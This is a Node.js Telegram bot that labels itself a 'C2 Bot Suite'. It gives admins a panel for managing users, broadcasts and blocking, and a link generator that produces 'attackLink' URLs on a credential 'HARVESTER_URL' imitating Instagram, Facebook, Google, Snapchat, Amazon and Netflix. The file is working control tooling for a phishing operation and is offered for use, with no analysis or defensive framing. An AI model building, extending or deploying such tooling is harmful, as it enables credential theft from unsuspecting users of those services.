const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ⚙️ ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const HARVESTER_URL = process.env.HARVESTER_URL;
const OWNER_ID = process.env.OWNER_ID; // Your numeric Telegram ID, the Super Admin
const CHANNEL_ID = process.env.CHANNEL_ID; // Your channel's ID ('@username' or '-100...')
const CHANNEL_LINK = process.env.CHANNEL_LINK; // Your channel's full link ('https://t.me/...')

// Check if all required environment variables are set
if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
    console.error("FATAL ERROR: One or more environment variables are missing.");
    process.exit(1); // Stop the bot if config is incomplete
}

// UPGRADED: Polling settings are now more robust to prevent conflicts.
const bot = new TelegramBot(BOT_TOKEN, { polling: { interval: 300, autoStart: true, params: { timeout: 10 } } });

const DB_PATH = './db.json';
let adminState = {}; // Tracks multi-step admin actions

// --- DATABASE HELPER FUNCTIONS ---
const readDb = () => {
    if (!fs.existsSync(DB_PATH)) {
        fs.writeFileSync(DB_PATH, JSON.stringify({ users: [], admins: [], blocked_users: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(DB_PATH));
};
const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));

// --- ADMIN CHECK FUNCTION ---
const isAdmin = (userId) => {
    const db = readDb();
    return db.admins.includes(userId) || userId.toString() === OWNER_ID;
};

// --- KEYBOARDS ---
const adminKeyboard = [
    [{ text: "📊 User Status", callback_data: "admin_status" }, { text: "📢 Broadcast", callback_data: "admin_broadcast" }],
    [{ text: "🔗 Generate Link", callback_data: "admin_generate_link" }],
    [{ text: "➕ Add Admin", callback_data: "admin_add" }, { text: "➖ Remove Admin", callback_data: "admin_remove" }],
    [{ text: "🚫 Block User", callback_data: "admin_block" }, { text: "✅ Unblock User", callback_data: "admin_unblock" }]
];
const userKeyboard = [
    [{ text: "♻️ Share Bot", callback_data: "user_share" }, { text: "✍️ Feedback", callback_data: "user_feedback" }],
    [{ text: "👑 Owner", callback_data: "user_owner" }]
];
const linkGenerationKeyboard = [
    [{ text: '📸 Instagram', callback_data: 'gen_link_Instagram' }, { text: '📘 Facebook', callback_data: 'gen_link_Facebook' }],
    [{ text: '🇬 Google', callback_data: 'gen_link_Google' }, { text: '👻 Snapchat', callback_data: 'gen_link_Snapchat' }],
    [{ text: '📦 Amazon', callback_data: 'gen_link_Amazon' }, { text: '🎬 Netflix', callback_data: 'gen_link_Netflix' }],
    [{ text: '⬅️ Back to Admin Panel', callback_data: 'admin_panel_back' }]
];

// --- /start COMMAND with FORCE JOIN ---
bot.onText(/\/start/, async (msg) => {
    const userId = msg.from.id;
    const db = readDb();

    if (db.blocked_users.includes(userId)) return;

    try {
        const chatMember = await bot.getChatMember(CHANNEL_ID, userId);
        if (!['member', 'administrator', 'creator'].includes(chatMember.status)) {
            throw new Error("User is not a member of the channel");
        }
        
        if (!db.users.includes(userId)) {
            db.users.push(userId);
            writeDb(db);
            if (userId.toString() !== OWNER_ID) {
                bot.sendMessage(OWNER_ID, `➕ New user joined: ${userId}`);
            }
        }
        
        if (isAdmin(userId)) {
            bot.sendMessage(userId, "👑 **Admin Panel** 👑\nWelcome, Operator.", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
        } else {
            bot.sendMessage(userId, "✅ Welcome! You can use the buttons below.", { reply_markup: { inline_keyboard: userKeyboard } });
        }
    } catch (error) {
        const joinMessage = `🛑 **ACCESS DENIED** 🛑\n\nTo use this bot, you must join our channel first.`;
        bot.sendMessage(userId, joinMessage, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '➡️ Join Channel ⬅️', url: CHANNEL_LINK }],
                    [{ text: '🔄 Joined! Click to Continue 🔄', callback_data: 'check_join' }]
                ]
            }
        });
    }
});

// --- MESSAGE HANDLER for admin replies ---
bot.on('message', (msg) => {
    const userId = msg.from.id;
    const text = msg.text;

    if (text === '/start') return; 

    if (adminState[userId]) {
        const action = adminState[userId];
        delete adminState[userId];

        const db = readDb();
        const targetId = parseInt(text);

        switch (action) {
            case 'broadcast':
                bot.sendMessage(userId, "📢 Broadcasting your message...");
                let successCount = 0;
                db.users.forEach(user => {
                    if (user.toString() !== OWNER_ID) { // Don't broadcast to self
                        bot.sendMessage(user, text).then(() => successCount++).catch(err => console.log(`Could not send to user ${user}`));
                    }
                });
                bot.sendMessage(userId, `✅ Broadcast sent. Reached ${successCount} users.`);
                break;
            case 'feedback':
                bot.sendMessage(OWNER_ID, `✍️ **New Feedback from user ${userId}**:\n\n${text}`, { parse_mode: 'Markdown' });
                bot.sendMessage(userId, "✅ Thank you for your feedback!");
                break;
            case 'add_admin':
                if (!isNaN(targetId) && !db.admins.includes(targetId)) {
                    db.admins.push(targetId); writeDb(db);
                    bot.sendMessage(userId, `✅ User ${targetId} is now an admin.`);
                } else { bot.sendMessage(userId, "❌ Invalid ID or user is already an admin."); }
                break;
            case 'remove_admin':
                 if (!isNaN(targetId) && db.admins.includes(targetId)) {
                    db.admins = db.admins.filter(id => id !== targetId); writeDb(db);
                    bot.sendMessage(userId, `✅ User ${targetId} is no longer an admin.`);
                } else { bot.sendMessage(userId, "❌ Invalid ID or user is not an admin."); }
                break;
            case 'block':
                 if (!isNaN(targetId)) {
                    db.blocked_users.push(targetId); writeDb(db);
                    bot.sendMessage(userId, `🚫 User ${targetId} has been blocked.`);
                } else { bot.sendMessage(userId, "❌ Invalid ID."); }
                break;
            case 'unblock':
                 if (!isNaN(targetId) && db.blocked_users.includes(targetId)) {
                    db.blocked_users = db.blocked_users.filter(id => id !== targetId); writeDb(db);
                    bot.sendMessage(userId, `✅ User ${targetId} has been unblocked.`);
                } else { bot.sendMessage(userId, "❌ Invalid ID or user is not blocked."); }
                break;
        }
    }
});

// --- CALLBACK QUERY HANDLER for button presses ---
bot.on('callback_query', (query) => {
    // ADDED: Lie detector to debug button presses
    console.log(`--- CALLBACK QUERY RECEIVED --- Data: ${query.data}, From: ${query.from.id}`);

    const userId = query.from.id;
    const data = query.data;
    const messageId = query.message.message_id;

    if (data === 'check_join') {
        bot.answerCallbackQuery(query.id);
        bot.sendMessage(userId, "Now please type /start again to verify your membership.");
        return;
    }

    if (!isAdmin(userId) && data.startsWith('admin_')) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Access Denied!", show_alert: true });
    }

    const [type, command, service] = data.split('_');

    if (type === 'admin') {
        const prompts = { 'broadcast': '✍️ Send the message to broadcast.', 'add': '✍️ Send the numeric ID of the new admin.', 'remove': '✍️ Send the numeric ID of the admin to remove.', 'block': '✍️ Send the numeric ID of the user to block.', 'unblock': '✍️ Send the numeric ID of the user to unblock.' };
        if (prompts[command]) {
            adminState[userId] = command;
            bot.sendMessage(userId, prompts[command]);
        } else if (command === 'status') {
            const db = readDb();
            const statusText = `📊 **Bot Status**\n\n👥 Total Users: ${db.users.length}\n👑 Admins: ${db.admins.length}\n🚫 Blocked Users: ${db.blocked_users.length}`;
            bot.editMessageText(statusText, { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
        } else if (command === 'generate') {
            bot.editMessageText("🔗 **Link Generator**\n\nSelect a service to generate a link.", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: linkGenerationKeyboard } });
        } else if (command === 'panel') {
             bot.editMessageText("👑 **Admin Panel** 👑", { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
        }
    } else if (type === 'gen') {
        const genService = command; // e.g., 'Instagram'
        const attackLink = `${HARVESTER_URL}/?service=${genService}`;
        bot.sendMessage(userId, `✅ **Link for [${genService}]**:\n\`${attackLink}\``, { parse_mode: 'Markdown' });
    } else if (type === 'user') {
        switch (command) {
            case 'share':
                bot.getMe().then(me => bot.sendMessage(userId, `♻️ Share this bot!\nhttps://t.me/${me.username}`));
                break;
            case 'feedback':
                adminState[userId] = 'feedback';
                bot.sendMessage(userId, "✍️ Please send your feedback message.");
                break;
            case 'owner':
                bot.sendMessage(userId, "👑 For queries, contact the owner.");
                break;
        }
    }
    bot.answerCallbackQuery(query.id);
});

// For any other errors
bot.on("polling_error", (error) => {
    console.log(`Polling Error: ${error.code} - ${error.message}`);
});

console.log('🔥 C2 Bot Suite (Upgraded) is online and operational.');
